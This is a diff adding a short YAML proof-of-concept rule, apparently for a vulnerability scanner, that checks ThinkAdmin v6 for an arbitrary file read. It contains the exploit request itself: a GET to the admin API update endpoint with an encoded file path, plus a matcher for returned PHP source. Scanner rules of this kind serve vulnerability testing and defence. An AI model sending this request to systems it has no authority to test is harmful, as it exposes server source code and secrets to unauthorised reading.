@@ -1,0 +1,13 @@
+name: poc-yaml-thinkadmin-v6-readfile
+rules:
+  - method: GET
+    path: /admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b2x322s2t3c1a342w34
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.content_type.contains("json") && response.body.bcontains(bytes("PD9waH")) && response.body.bcontains(bytes("VGhpbmtBZG1pbg"))
+detail:
+  author: 0x_zmz(github.com/0x-zmz)
+  info: thinkadmin-v6-readfile By 0x_zmz
+  links:
+    - https://mp.weixin.qq.com/s/3t7r7FCirDEAsXcf2QMomw
+    - https://github.com/0x-zmz
